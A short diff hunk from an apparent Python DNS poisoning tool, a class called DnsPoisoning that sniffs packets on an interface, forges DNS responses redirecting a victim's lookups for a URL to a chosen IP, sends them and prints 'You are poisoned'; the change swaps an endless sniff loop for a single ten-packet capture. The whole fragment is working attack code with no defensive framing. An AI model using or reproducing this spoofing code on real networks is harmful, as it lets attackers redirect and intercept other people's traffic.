@@ -27,12 +27,9 @@ class DnsPoisoning:
                     send(poisonPacket, verbose=0, iface=interface)
                     print("Fake packet sent")
 
-        while True:
-            sniff(count=1,  # capture 1 packet
-                  store=0,  # do not store it
-                  prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
-                  iface=self.interface)
-
-
-
+        sniff(count=10,  # capture 1 packet
+            store=0,  # do not store it
+            prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
+            iface=self.interface)
+        
         print("You are poisoned")
